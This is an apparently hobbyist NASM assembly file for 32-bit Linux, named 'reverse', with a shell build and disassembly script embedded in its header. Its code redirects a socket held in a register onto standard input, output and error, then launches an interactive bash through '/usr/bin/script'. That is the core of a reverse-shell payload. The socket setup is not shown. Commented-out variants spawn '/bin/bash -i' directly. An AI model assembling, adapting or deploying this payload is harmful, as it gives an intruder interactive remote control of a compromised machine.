%if 0

OUT=reverse.com
OUT=rr
set -e
#set -o pipefail
if [ -n "${FULL-}" ]; then
	rm -f $OUT $OUT.o
	nasm -g -I asmlib/ -f elf32 -o $OUT.o "$0" "$@" 2>&1 | grep -vF ': ... from macro '
	FLAGS=
	ld $FLAGS -m elf_i386 -z noseparate-code $OUT.o -o $OUT
	cp $OUT $OUT.full
	ls -l $OUT.full
	sstrip -z $OUT
else
	rm -f $OUT
	nasm -I asmlib/ -f bin -o $OUT "$0" "$@" 2>&1 | grep -vF ': ... from macro '
fi
ls -l $OUT
chmod +x $OUT

#DUMP="--no-addresses -Mintel"
DUMP="-Mintel"
DUMP="--no-addresses -Mintel"
if [ -n "${FULL-}" ]; then
	#objdump --visualize-jumps=color -d $OUT.full
	objdump $DUMP -d $OUT.full
else
	OFF=$(  readelf2 -lW $OUT 2>/dev/null | awk '$2=="0x000000"{print $3}')
	#OFF="0x10000"
	START=$(readelf2 -hW $OUT 2>/dev/null | awk '$1=="Entry"{print $4}')
	objdump $DUMP -b binary -m i386 -D $OUT --adjust-vma="$OFF" --start-address="$START"
	#objdump --visualize-jumps=color -b binary -m i386 -D $OUT --adjust-vma="$OFF" --start-address="$START"
fi

set +e
ls -l $OUT
#strace -E_=com -frni ./$OUT
echo ret $?
exit

%endif

%define REG_OPT		1
%define REG_SEARCH	1
%define REG_ASSERT	0
%define LINCOM		1

%include "stdlib.mac"
;%define arg(a) %tok(a).nolist
;%include "generic.mac"
;%include "syscall.mac"
%define zero_seg 0
%define stack_cleanup 1

%define SOCKET		ebx

envp_:
	%assign	stack_offset	128+8-0 ; alloca plus sockaddr struct
	;%assign	stack_offset	8-0 ; sockaddr struct
	;lea	edi, [esp+stack_offset]
	;mov	edx, [edi]
	mov	edx, [esp+stack_offset]
	;reg
	lea     edx, [esp+4*edx+8+stack_offset]
	;lea     edx, [4*edx+8+edi]
%if 0
	mov	edi, [edx]
	puts	edi
	taint	edx
	;exit
;%else
%endif
%if 1
	dup_:
	dup2	SOCKET, 0
	rset	eax, 0
	dup2	SOCKET, 1
	rset	eax, 1
	dup2	SOCKET, 2
	rset	eax, 2

	winsize:
	;setwinsize 80, 25

	execprep:
	%if 0
		push	`-i\0\0`
		set     eax, esp
		taint   eax

		push	`h\0\0\0`
		push	`/bas`
		push	`/bin`

		set     ebx, esp
		push0
		push	eax
		push    ebx

	%elif 0
	; /usr/bin/script -qc /bin/bash
		push	`h\0\0\0`
		push	`/bas`
		push	`/bin`
		set     esi, esp

		push	`-qc\0`
		set     eax, esp

		push	`ipt\0`
		push	`/scr`
		push	`/bin`
		push	`/usr`
		
		set     ebx, esp
		push0
		push	esi
		push	eax
		push    ebx

	%else
	; /usr/bin/script -qc /bin/bash
		call	.code
.string1:	db	"/bin/bash", 0
.string2:	db	"-qc", 0
.string3:	db	"/usr/bin/script", 0

.code:		
		;set     ebx, esp
		pop	ebx
		push0
		push	ebx
		add	ebx, .string2 - .string1
		push	ebx
		add	ebx, .string3 - .string2
		push	ebx
		taint	ebx

	%endif

	execve:
	execve	ebx, esp, edx
%endif

;%include "regdump2.mac"
